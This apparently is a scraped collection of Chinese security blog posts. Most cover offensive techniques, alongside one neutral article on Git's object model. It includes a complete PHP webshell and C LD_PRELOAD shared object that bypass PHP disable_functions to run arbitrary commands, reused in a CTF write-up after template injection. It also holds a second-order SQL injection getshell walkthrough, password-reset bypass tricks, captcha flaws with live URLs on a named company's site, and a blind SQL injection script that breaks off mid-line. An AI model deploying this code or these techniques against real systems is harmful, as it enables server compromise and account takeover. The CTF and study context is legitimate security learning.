Imagick()： 运行 strace -f php image.php 2&gt;&amp;1 | grep -A2 -B2 execve 查看 Imagick() 是否启动新进程： 第一个 execve 是启动 PHP 解释器而已，必须找到第二个 execve，没有则说明并未启动新进程；请求网页，新建 http.php，调用 curl_init()： 运行 strace -f php http.php 2&gt;&amp;1 | grep -A2 -B2 execve 查看 curl_init() 是否启动新进程： 仍然不是我要的；发送邮件，新建 mail.php，调用 mail()： 运行 strace -f php mail.php 2&gt;&amp;1 | grep -A2 -B2 execve 查看 mail() 是否启动新进程：bingo！mail() 内部启动了 /usr/sbin/sendmail、/usr/sbin/postdrop 两个新进程，它就是我一直苦寻的函数（用相同的测试方式，还找到一个 imap_mail()）。 PHP 环境下劫持系统函数注入代码。mail.php 内增加设置 LD_PRELOAD 的代码： 然后将 mail.php 以及内含 mail() 函数的共享对象 getuid_shadow.so 放入 web 目录 /var/www/： 执行 mail.php 之后，找到 getuid_shadow.so 中 mail() 创建的文件 /tmp/evil，成功在 PHP 环境下不借助任何 PHP 命令执行函数执行命令： 有了前面的分析，看我如何在目标站点绕过 disable_functions 执行系统命令。 首先，基于前面的 mail.php 写了个小马 bypass_disablefunc.php： bypass_disablefunc.php 提供三个 GET 参数。一是 cmd 参数，待执行的系统命令（如 pwd）；二是 outpath 参数，保存命令执行输出结果的文件路径（如 /tmp/xx），便于在页面上显示，另外关于该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点；三是 sopath 参数，指定劫持系统函数的共享对象的绝对路径（如 /var/www/bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。此外，bypass_disablefunc.php 拼接命令和输出路径成为完整的命令行，所以你不用在 cmd 参数中重定向了： 1$evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;; 同时，通过环境变量 EVIL_CMDLINE 向 bypass_disablefunc_x64.so 传递具体执行的命令行信息： 1putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline); 然后，基于 getuid_shadow.c 编写劫持函数的代码 bypass_disablefunc.c。回想下，先前我之所以劫持 getuid()，是因为 sendmail 程序会调用该函数，在真实环境中，存在两方面问题：一是，某些环境中，web 禁止启用 senmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改 php.ini 配置、去安装 sendmail 软件；二是，即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts（如，127.0.0.1 lamp、lamp.、lamp.com）。基于这两个原因，我不得不放弃劫持函数 getuid()，必须找个更普适的方法。回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那我就完全可以不依赖 sendmail 了。这种场景与 C++ 的构造函数简直神似！几经搜索后了解到，GCC 有个 C 语言扩展修饰符 attribute((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 attribute((constructor)) 修饰的函数。 首先php设置好 LD_PRELOAD, 然后调用mail() mail中会启动新的进程(例如 sendmail, postdrop),新的进程会加载 LD_PRELOAD LD_PRELOAD中bypass_disablefunc.so文件中定义了 attribute 所以 新进程的main函数调用前会先调用我们的恶意代码 强调下，这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，我们不要局限于仅劫持某一函数，而应考虑劫持共享对象。bypass_disablefunc.c 源码如下： 从环境变量 EVIL_CMDLINE 中接收 bypass_disablefunc.php 传递过来的待执行的命令行。 接着，用命令 gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so 将 bypass_disablefunc.c 编译为共享对象 bypass_disablefunc_x64.so： 你要根据目标架构编译成不同版本，在 x64 的环境中编译，若不带编译选项则默认为 x64，若要编译成 x86 架构需要加上 -m32 选项。 最后，用菜刀将 bypass_disablefunc.php 和 bypass_disablefunc_x64.so 传到目标： 指定好命令输出路径、共享对象路径后，在 bypass_disablefunc.php 上再次执行先前失败的命令 cat /proc/meminfo： 啊哈！很酷对不对。 好了，巧用 LD_PRELOAD 突破 disable_functions 的手法就是这样子，唯一条件，PHP 支持putenv()、mail() 即可，甚至无需安装 sendmail。那么，现在的情况是，我知道你很忙，没时间看前面的技术细节，要的只是开箱即用的工具。行，bypass_disablefunc.php、bypass_disablefunc.c、bypass_disablefunc_x64.so 托管在 https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD，自取。 bypassdisablefunc.php 12345678910111213141516171819&lt;?php echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;; $cmd = $_GET[&quot;cmd&quot;]; $out_path = $_GET[&quot;outpath&quot;]; $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;; echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;; putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline); $so_path = $_GET[&quot;sopath&quot;]; putenv(&quot;LD_PRELOAD=&quot; . $so_path); mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;); echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; unlink($out_path);?&gt; bypass_disablefunc.c 12345678910111213141516171819202122232425262728#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;extern char** environ;__attribute__ ((__constructor__)) void preload (void)&#123; // get command line options and arg const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;); // unset environment variable LD_PRELOAD. // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) &#123; if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) &#123; environ[i][0] = &#x27;\\0&#x27;; &#125; &#125; // executive command system(cmdline);&#125;"},{"title":"LD_PRELOAD","date":"2020-04-09","updated":"2024-03-19","path":"2020/04/09/LD-PRELOAD/","text":"一、LD_PRELOAD是什么 LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。 二、程序调用流图 LA_PRELOAD替换前 LA_PRELOAD替换后 三、演示程序代码 主程序 1234567891011121314151617// myverifypasswd.c#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &quot;mystrcmp.h&quot; void main(int argc,char **argv) &#123; char passwd[] = &quot;password&quot;; if (argc &lt; 2) &#123; printf(&quot;usage: %s &lt;password&gt;\\n&quot;,argv[0]); return; &#125; if (!mystrcmp(passwd,argv[1])) &#123; printf(&quot;Correct Password!\\n&quot;); return; &#125; printf(&quot;Invalid Password!\\n&quot;);&#125; 调用库 123// mystrcmp.h#include &lt;stdio.h&gt;int mystrcmp(const char *s1, const char *s2); 123456789// mystrcmp.c#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &quot;mystrcmp.h&quot; int mystrcmp(const char *s1, const char *s2)&#123; return strcmp(s1,s2); //正常字串比较&#125; 四、程序编译与试验 演示流程图 编译、设置指令 12345gcc mystrcmp.c -fPIC -shared -o libmystrcmp.so #编译动态链接库gcc myverifypasswd.c -L. -lmystrcmp -o myverifypasswd #编译主程序export LD_LIBRARY_PATH=/home/n6/桌面/LD_PRELOAD #指定动态链接库所在目录位置ldd myverifypasswd #显示、确认依赖关系./myverifypasswd #运行主程序myverifypasswd 终端运行结果 123456789101112131415n6@X240s:~/桌面/LD_PRELOAD$ gcc mystrcmp.c -fPIC -shared -o libmystrcmp.son6@X240s:~/桌面/LD_PRELOAD$ gcc myverifypasswd.c -L. -lmystrcmp -o myverifypasswdn6@X240s:~/桌面/LD_PRELOAD$ export LD_LIBRARY_PATH=/home/n6/桌面/LD_PRELOADn6@X240s:~/桌面/LD_PRELOAD$ ldd myverifypasswd linux-vdso.so.1 =&gt; (0x00007ffedc1bd000) libmystrcmp.so =&gt; /home/n6/桌面/LD_PRELOAD/libmystrcmp.so (0x00007eff99a7f000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007eff99698000) /lib64/ld-linux-x86-64.so.2 (0x000056269aba4000) n6@X240s:~/桌面/LD_PRELOAD$ ./myverifypasswdusage: ./myverifypasswd &lt;password&gt;n6@X240s:~/桌面/LD_PRELOAD$ ./myverifypasswd abcInvalid Password!n6@X240s:~/桌面/LD_PRELOAD$ ./myverifypasswd passwordCorrect Password! 五、替换库代码 12345678910// myhack.c#include &lt;stdio.h&gt;#include &lt;string.h&gt; int mystrcmp(const char *s1, const char *s2)&#123; printf(&quot;hack function invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;\\n&quot;, s1, s2); // always return 0, which means s1 equals to s2--总是相等 return 0;&#125; 六、替换并测试运行 替换流程图 编译、设置指令 123gcc myhack.c -fPIC -shared -o myhack.so #编译替换库export LD_PRELOAD=&quot;./myhack.so&quot; #设置LD_PRELOAD环境变量,库中的同名函数在程序运行时优先调用./myverifypasswd #运行主程序 终端运行结果 1234567891011n6@X240s:~/桌面/LD_PRELOAD$ gcc myhack.c -fPIC -shared -o myhack.son6@X240s:~/桌面/LD_PRELOAD$ export LD_PRELOAD=&quot;./myhack.so&quot;n6@X240s:~/桌面/LD_PRELOAD$ ./myverifypasswdusage: ./myverifypasswd &lt;password&gt;n6@X240s:~/桌面/LD_PRELOAD$ ./myverifypasswd abchack function invoked. s1=&lt;password&gt; s2=&lt;abc&gt;Correct Password!n6@X240s:~/桌面/LD_PRELOAD$ ./myverifypasswd passwordhack function invoked. s1=&lt;password&gt; s2=&lt;password&gt;Correct Password!n6@X240s:~/桌面/LD_PRELOAD$ unset LD_PRELOAD 七、LD_PRELOAD运用总结 定义与目标函数完全一样的函数，包括名称、变量及类型、返回值及类型等 将包含替换函数的源码编译为动态链接库 通过命令 export LD_PRELOAD=&quot;库文件路径&quot;，设置要优先替换动态链接库 如果找不替换库，可以通过 export LD_LIBRARY_PATH=库文件所在目录路径，设置系统查找库的目录 替换结束，要还原函数调用关系，用命令unset LD_PRELOAD 解除 想查询依赖关系，可以用ldd 程序名称"},{"title":"攻防世界","date":"2020-04-09","updated":"2024-03-19","path":"2020/04/09/攻防世界/","text":"smart 模板注入 mail LD_PRELOAD 页面下方写有Smarty字样，所以可能存在模板注入漏洞，经过测试漏洞点在xff处，如下写入webshell 发现open_basedir被限制为/var/www/html和/tmp目录，而disable_funcitions如下： 但是mail和putenv没有被禁用，于是使用LD_PRELOAD来进行突破，C语言代码如下： 123456789101112131415161718192021222324252627#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;extern char** environ;__attribute__ ((__constructor__)) void preload (void)&#123; // get command line options and arg const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;); // unset environment variable LD_PRELOAD. // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) &#123; if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) &#123; environ[i][0] = &#x27;\\0&#x27;; &#125; &#125; // executive command system(cmdline);&#125; 文件名为bypass_disablefunc.c，使用gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so，在linux下编译生成so文件，上传so文件和对应如下代码 12345678910111213&lt;?php echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;; $cmd = $_GET[&quot;cmd&quot;]; $out_path = $_GET[&quot;outpath&quot;]; $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;; echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;; putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline); $so_path = $_GET[&quot;sopath&quot;]; putenv(&quot;LD_PRELOAD=&quot; . $so_path); mail(&quot;&quot;, &quot;&quot;, &quot;&quot;,&quot;&quot;); echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; unlink($out_path);?&gt; 执行得到flag:"},{"title":"补天-杭州恒业网络信息有限公司","date":"2020-04-04","updated":"2024-03-19","path":"2020/04/04/补天-杭州恒业网络信息有限公司/","text":"https://www.qgyyzs.net/zs/find.asp?xuanze=1 https://www.qgyyzs.net/business/registerinfo2.asp 验证码一段时间重复使用 时效性 首先用admin修改返回值获得验证码,然后修改用户名为testtest后没修改验证码竟然能通过 ??? 发验证码 没和用户信息进行绑定 0x0001 0x0800 0x06 0x04 0x0001 23:45:AB:4F:67:CD 125.45.23.12 AA:BB:A2:4F:67:CD 125.11.78.10"},{"title":"任意用户密码重置10种姿势","date":"2020-04-04","updated":"2024-03-19","path":"2020/04/04/任意用户密码重置10种姿势/","text":"验证码不失效 验证码直接返回 验证码未绑定用户 修改接受的手机或邮箱 本地验证绕过 跳过验证步骤 未校验用户字段的值 修改密码处id可替换 Cookie值的替换 修改信息时替换字段"},{"title":"XDCTF2015","date":"2020-03-31","updated":"2024-03-19","path":"2020/03/31/XDCTF2015/","text":"0x01 filemanager 0x01 分析 上传有黑名单,无法直接传php,在rename.php中存在这二次注入问题 12result = $db-&gt;query(&quot;select * from `file` where `filename`=&#x27;&#123;$req[&#x27;oldname&#x27;]&#125;&#x27;&quot;); $re = $db-&gt;query(&quot;update `file` set `filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#123;$result[&#x27;filename&#x27;]&#125;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot;); rename.php可以对文件进行重命名并且没有黑名单限制,但是最后会自动加上重命名文件的后缀extension,这个后缀是从数据库中取出来的肯定是在白名单中的 12345$oldname = UPLOAD_DIR . $result[&quot;filename&quot;] . $result[&quot;extension&quot;];$newname = UPLOAD_DIR . $req[&quot;newname&quot;] . $result[&quot;extension&quot;];if (file_exists($oldname)) &#123; rename($oldname, $newname);&#125; 这就利用到了update注入,通过这个注入我们可以修改filename和extension. 首先想到修改原文件在数据库中的后缀为php或者为空,这里不能修改为php是因为下面的file_exists要求原文件必须已经存在,显然php文件不可能已经存在(不然还费啥劲),那就只能修改为空 实际存在的文件肯定有后缀,而且是白名单中的,那我们修改后缀为空后,数据库中的文件名filename就应该含有后缀 12345源文件 a.jpgupdate注入前数据库中的存储: filename=&quot;a&quot; extension=&quot;.jpg&quot;update注入后: filename=&quot;a.jpg&quot; extension=&quot;&quot;拼凑成文件名的方式是 filename+extension所以注入前注入后拼凑的文件名相同 这就要求在上传文件的时候要含有两个后缀,例如:a.jpg.jpg,数据库中存储的数据为filename=&quot;a.jpg&quot; extension=&quot;.jpg&quot;,实际存在的文件为a.jpg.jpg 上传这个文件后经过第一次update注入变成了filename=&quot;a.jpg&quot; extension=&quot;&quot; 然后经过file_exists检查,a.jpg实际是不存在的,所以我们重新上传一个新的文件a.jpg,来使实际存在的文件中包含a.jpg从而绕过file_exists的检查. 此时的extension已经成了空,所以下一步就准备修改文件名为a.php 0x03 官方wp 一、入口：二次注入漏洞 此题入口点是二次注入。 在common.inc.php中可以看到全局进行了转义，这样常规注入少了大部分。遍观代码，输入处没有任何反转义、反解压、数字型等特殊情况，基本可以确定不存在直接的注入漏洞。 看到上传处的代码upload.php： 1234567891011121314151617181920212223&lt;?php$name = basename($file[&quot;name&quot;]);$path_parts = pathinfo($name);if(!in_array($path_parts[&quot;extension&quot;], [&quot;gif&quot;, &quot;jpg&quot;, &quot;png&quot;, &quot;zip&quot;, &quot;txt&quot;])) &#123; exit(&quot;error extension&quot;);&#125;$path_parts[&quot;extension&quot;] = &quot;.&quot; . $path_parts[&quot;extension&quot;];$name = $path_parts[&quot;filename&quot;] . $path_parts[&quot;extension&quot;];$path_parts[&quot;filename&quot;] = $db-&gt;quote($path_parts[&quot;filename&quot;]);$fetch = $db-&gt;query(&quot;select * from `file` where`filename`=&#123;$path_parts[&#x27;filename&#x27;]&#125;and `extension`=&#123;$path_parts[&#x27;extension&#x27;]&#125;&quot;);if($fetch &amp;&amp; $fetch-&gt;fetchAll()) &#123; exit(&quot;file is exists&quot;);&#125;if(move_uploaded_file($file[&quot;tmp_name&quot;], UPLOAD_DIR . $name)) &#123; $re = $db-&gt;exec(&quot;insert into `file` ( `filename`, `view`, `extension`) values ( &#123;$path_parts[&#x27;filename&#x27;]&#125;, 0, &#x27;&#123;$path_parts[&#x27;extension&#x27;]&#125;&#x27;)&quot;); if(!$re) &#123; print_r($db-&gt;errorInfo()); exit; &#125; 可见，上传的文件名走过的流程是： $file[‘name’] -&gt; pathinfo() –&gt; $path_parts[&quot;filename&quot;] -&gt; quote() -&gt; insert 由于经过了pdo的quote方法转义，所以此处也不存在注入。 再看到rename.php: 12345678910111213&lt;?php$result = $db-&gt;query(&quot;select * from `file` where `filename`=&#x27;&#123;$req[&#x27;oldname&#x27;]&#125;&#x27;&quot;);if ($result) &#123; $result = $result-&gt;fetch();&#125;if(!$result) &#123; exit(&quot;old file doesn&#x27;t exists!&quot;);&#125; else &#123; $req[&#x27;newname&#x27;] = basename($req[&#x27;newname&#x27;]); $re = $db-&gt;exec(&quot;update `file` set `filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#123;$result[&#x27;filename&#x27;]&#125;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot;); 根据$req['filename']从数据库里查询到已存在的一行，并调用update语句进行修改。 但这里oldname='&#123;$result['filename']&#125;' 将从数据库里查出的$result['filename']再一次入库，结果造成一个二次注入。 二、利用二次操作进行getshell 那么注入有什么用？ 这应该是大家拿到题目，想到的第一个问题。这题明显与getshell有关，源码里包含文件上传、文件改名、文件删除等函数。 我们来一个个分析。 首先upload.php是文件上传的操作，但可见上传处对文件进行了白名单验证： 1234&lt;?phpif(!in_array($path_parts[&quot;extension&quot;], [&quot;gif&quot;, &quot;jpg&quot;, &quot;png&quot;, &quot;zip&quot;, &quot;txt&quot;])) &#123; exit(&quot;error extension&quot;);&#125; 导致我们无法上传恶意文件。 其次是delete.php，这个文件其实是个烟雾弹，删除操作并不能利用。 再次是rename.php，这里明显是getshell的关键。 12345678910111213141516171819202122&lt;?php$result = $db-&gt;query(&quot;select * from `file` where `filename`=&#x27;&#123;$req[&#x27;oldname&#x27;]&#125;&#x27;&quot;);if ($result) &#123; $result = $result-&gt;fetch();&#125;if(!$result) &#123; exit(&quot;old file doesn&#x27;t exists!&quot;);&#125; else &#123; $req[&#x27;newname&#x27;] = basename($req[&#x27;newname&#x27;]); $re = $db-&gt;exec(&quot;update `file` set `filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#123;$result[&#x27;filename&#x27;]&#125;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot;); if(!$re) &#123; print_r($db-&gt;errorInfo()); exit; &#125; $oldname = UPLOAD_DIR . $result[&quot;filename&quot;] . $result[&quot;extension&quot;]; $newname = UPLOAD_DIR . $req[&quot;newname&quot;] . $result[&quot;extension&quot;]; if(file_exists($oldname)) &#123; rename($oldname, $newname); &#125; 最重要的就是后面这5行。 Oldname和newname，有几个特点： 后缀相同，都是$result[‘extension’] oldname的文件名来自数据库，newname的文件名来自用户输入 首先后缀相同这个特点，就导致getshell似乎难以完成，如果要getshell那么一定要将“非.php”后缀的文件重命名成“.php”的文件。后缀相同怎么重命名？ 除非后缀为空！ 所以我们的update型注入就开始派上用场了。通过update型注入，我们可以将数据库中extension字段的值改为空，同时也可以控制filename的值，那么等于说我能控制rename函数的两个参数的值，这样getshell就近在咫尺了。 但还有个坑，这里改名的时候检查了文件是否存在：if(file_exists($oldname))我虽然通过注入修改了filename的值，但我upload目录下上传的文件名是没有改的。 因为我利用注入将extension改为空了，那么实际上数据库中的filename总比文件系统中真是的文件名少一个后缀。 那么这里的file_exists就验证不过。怎么办？ 简单啊，再次上传一个新文件，这个文件名就等于数据库里的filename的值就好了。 所以最后整个getshell的流程，实际上是一个二次注入 + 二次操作getshell。 三、具体流程 1、 选择文件上传： 2、rename造成注入： 3、上传真正包含webshell的文件x.jpg： 4、重命名进行getshell： 5、成功"},{"title":"GIT对象模型","date":"2020-03-30","updated":"2024-03-19","path":"2020/03/30/GIT对象模型/","text":"GIT对象模型 SHA 所有用来表示项目历史信息的文件,是通过一个40个字符的（40-digit）“对象名”来索引的，对象名看起来像这样: 16ff87c4664981e4397625791c8ea3bbb5f2279a3 你会在Git里到处看到这种“40个字符”字符串。每一个“对象名”都是对“对象”内容做SHA1哈希计算得来的，（SHA1是一种密码学的哈希算法）。这样就意味着两个不同内容的对象不可能有相同的“对象名”。 这样做会有几个好处： Git只要比较对象名，就可以很快的判断两个对象是否相同。 因为在每个仓库（repository）的“对象名”的计算方法都完全一样，如果同样的内容存在两个不同的仓库中，就会存在相同的“对象名”下。 Git还可以通过检查对象内容的SHA1的哈希值和“对象名”是否相同，来判断对象内容是否正确。 对象 每个对象(object) 包括三个部分：类型，大小和内容。大小就是指内容的大小，内容取决于对象的类型，有四种类型的对象：“blob”、“tree”、 “commit” 和&quot;tag&quot;。 **“blob”**用来存储文件数据，通常是一个文件。 **“tree”有点像一个目录，它管理一些“tree”**或是 “blob”（就像文件和子目录） 一个**“commit”**只指向一个&quot;tree&quot;，它用来标记项目某一个特定时间点的状态。它包括一些关于时间点的元数据，如时间戳、最近一次提交的作者、指向上次提交（commits）的指针等等。 一个**“tag”**是来标记某一个提交(commit) 的方法。 几乎所有的Git功能都是使用这四个简单的对象类型来完成的。它就像是在你本机的文件系统之上构建一个小的文件系统。 与SVN的区别 Git与你熟悉的大部分版本控制系统的差别是很大的。也许你熟悉Subversion、CVS、Perforce、Mercurial 等等，他们使用 “增量文件系统” （Delta Storage systems）, 就是说它们存储每次提交(commit)之间的差异。Git正好与之相反，它会把你的每次提交的文件的全部内容（snapshot）都会记录下来。这会是在使用Git时的一个很重要的理念。 Blob对象 一个blob通常用来存储文件的内容. 你可以使用git show命令来查看一个blob对象里的内容。假设我们现在有一个Blob对象的SHA1哈希值，我们可以通过下面的的命令来查看内容： 123456$ git show 6ff87c4664 Note that the only valid version of the GPL as far as this project is concerned is _this_ particular version of the license (ie v2, not v2.2 or v3.x or whatever), unless explicitly otherwise stated.... 一个&quot;blob对象&quot;就是一块二进制数据，它没有指向任何东西或有任何其它属性，甚至连文件名都没有. 因为blob对象内容全部都是数据，如两个文件在一个目录树（或是一个版本仓库）中有同样的数据内容，那么它们将会共享同一个blob对象。Blob对象和其所对应的文件所在路径、文件名是否改被更改都完全没有关系。 Tree 对象 一个tree对象有一串(bunch)指向blob对象或是其它tree对象的指针，它一般用来表示内容之间的目录层次关系。 git show命令还可以用来查看tree对象，但是git ls-tree能让你看到更多的细节。如果我们有一个tree对象的SHA1哈希值，我们可以像下面一样来查看它： 12345678910$ git ls-tree fb3a8bdd0ce100644 blob 63c918c667fa005ff12ad89437f2fdc80926e21c .gitignore100644 blob 5529b198e8d14decbe4ad99db3f7fb632de0439d .mailmap100644 blob 6ff87c4664981e4397625791c8ea3bbb5f2279a3 COPYING040000 tree 2fb783e477100ce076f6bf57e4a6f026013dc745 Documentation100755 blob 3c0032cec592a765692234f1cba47dfdcc3a9200 GIT-VERSION-GEN100644 blob 289b046a443c0647624607d471289b2c7dcd470b INSTALL100644 blob 4eb463797adc693dc168b926b6932ff53f17d0b1 Makefile100644 blob 548142c327a6790ff8821d67c2ee1eff7a656b52 README... 就如同你所见，一个tree对象包括一串(list)条目，每一个条目包括：mode、对象类型、SHA1值 和名字(这串条目是按名字排序的)。它用来表示一个目录树的内容。 一个tree对象可以指向(reference): 一个包含文件内容的blob对象, 也可以是其它包含某个子目录内容的其它tree对象. Tree对象、blob对象和其它所有的对象一样，都用其内容的SHA1哈希值来命名的；只有当两个tree对象的内容完全相同（包括其所指向所有子对象）时，它的名字才会一样，反之亦然。这样就能让Git仅仅通过比较两个相关的tree对象的名字是否相同，来快速的判断其内容是否不同。 (注意：在submodules里，trees对象也可以指向commits对象. 请参见 Submodules 章节) 注意：所有的文件的mode位都是644 或 755，这意味着Git只关心文件的可执行位. Commit对象 “commit对象&quot;指向一个&quot;tree对象”, 并且带有相关的描述信息. 你可以用 --pretty=raw 参数来配合 git show 或 git log 去查看某个提交(commit): 12345678910$ git show -s --pretty=raw 2be7fcb476commit 2be7fcb4764f2dbcee52635b91fedb1b3dcf7ab4tree fb3a8bdd0ceddd019615af4d57a53f43d8cee2bfparent 257a84d9d02e90447b149af58b271c19405edb6aauthor Dave Watson &lt;dwatson@mimvista.com&gt; 1187576872 -0400committer Junio C Hamano &lt;gitster@pobox.com&gt; 1187591163 -0700 Fix misspelling of &#x27;suppress&#x27; in docs Signed-off-by: Junio C Hamano &lt;gitster@pobox.com&gt; 你可以看到, 一个提交(commit)由以下的部分组成: 一个 tree 对象: tree对象的SHA1签名, 代表着目录在某一时间点的内容. 父对象 (parent(s)): 提交(commit)的SHA1签名代表着当前提交前一步的项目历史. 上面的那个例子就只有一个父对象; 合并的提交(merge commits)可能会有不只一个父对象. 如果一个提交没有父对象, 那么我们就叫它“根提交&quot;(root commit), 它就代表着项目最初的一个版本(revision). 每个项目必须有至少有一个“根提交&quot;(root commit). 一个项目可能有多个&quot;根提交“，虽然这并不常见(这不是好的作法). 作者 : 做了此次修改的人的名字, 还有修改日期. 提交者（committer): 实际创建提交(commit)的人的名字, 同时也带有提交日期. TA可能会和作者不是同一个人; 例如作者写一个补丁(patch)并把它用邮件发给提交者, 由他来创建提交(commit). －注释 用来描述此次提交. 注意: 一个提交(commit)本身并没有包括任何信息来说明其做了哪些修改; 所有的修改(changes)都是通过与父提交(parents)的内容比较而得出的. 值得一提的是, 尽管git可以检测到文件内容不变而路径改变的情况, 但是它不会去显式(explicitly)的记录文件的更名操作. (你可以看一下 git diff 的 -M 参数的用法) 一般用 git commit 来创建一个提交(commit), 这个提交(commit)的父对象一般是当前分支(current HEAD), 同时把存储在当前索引(index)的内容全部提交. 对象模型 现在我们已经了解了3种主要对象类型(blob, tree 和 commit), 好现在就让我们大概了解一下它们怎么组合到一起的. 如果我们一个小项目, 有如下的目录结构: 123456789$&gt;tree.|-- README`-- lib |-- inc | `-- tricks.rb `-- mylib.rb2 directories, 3 files 如果我们把它提交(commit)到一个Git仓库中, 在Git中它们也许看起来就如下图: 你可以看到: 每个目录都创建了 tree对象 (包括根目录), 每个文件都创建了一个对应的 blob对象 . 最后有一个 commit对象 来指向根tree对象(root of trees), 这样我们就可以追踪项目每一项提交内容. 标签对象 一个标签对象包括一个对象名(译者注:就是SHA1签名), 对象类型, 标签名, 标签创建人的名字(“tagger”), 还有一条可能包含有签名(signature)的消息. 你可以用 git cat-file 命令来查看这些信息: 1234567891011121314$ git cat-file tag v1.5.0object 437b1b20df4b356c9342dac8d38849f24ef44f27type committag v1.5.0tagger Junio C Hamano &lt;junkio@cox.net&gt; 1171411200 +0000GIT 1.5.0-----BEGIN PGP SIGNATURE-----Version: GnuPG v1.4.6 (GNU/Linux)iD8DBQBF0lGqwMbZpPMRm5oRAuRiAJ9ohBLd7s2kqjkKlq1qqC57SbnmzQCdG4uinLE/L9aUXdWeTFPron96DLA==2E+0-----END PGP SIGNATURE----- 点击 git tag, 可以了解如何创建和验证标签对象. (注意: git tag 同样也可以用来创建 “轻量级的标签”(lightweight tags), 但它们并不是标签对象, 而只一些以 “refs/tags/” 开头的引用罢了). http://gitbook.liuhui998.com/1_2.html"},{"title":"XTCTF","date":"2020-03-30","updated":"2024-03-19","path":"2020/03/30/XTCTF/","text":"Web_python_flask_sql_injection 1.下载附件，查看代码，发现基于flask框架。 2.查看注册框架RegistrationForm发现对注册邮箱过滤不严格 3.查看邮箱验证函数validate_email跟入到mysql.One中，拼接sql语句为select id from user where email = 'your input email' 4.结合注入，拼接后的sql语句为select id from user where email = 'test'/**/or/**/1=1#@test.com' 5.由于注入不回显，因此采用盲注，在邮箱验证函数中可以看到，当使用重复邮箱注册时，会进行提示。 6.构建exp（注册一个用户，然后将脚本中的邮箱改为和注册时相同的邮箱） 123456789101112131415161718192021222324252627282930313233343536import requestsfrom bs4 import BeautifulSoupurl = &quot;http://127.0.0.1:8006/register&quot;r = requests.get(url)soup = BeautifulSoup(r.text,&quot;html5lib&quot;)token = soup.find_all(id=&#x27;csrf_token&#x27;)[0].get(&quot;value&quot;)notice = &quot;Please use a different email address.&quot;result = &quot;&quot;database = &quot;(SELECT/**/GROUP_CONCAT(schema_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA)&quot;tables = 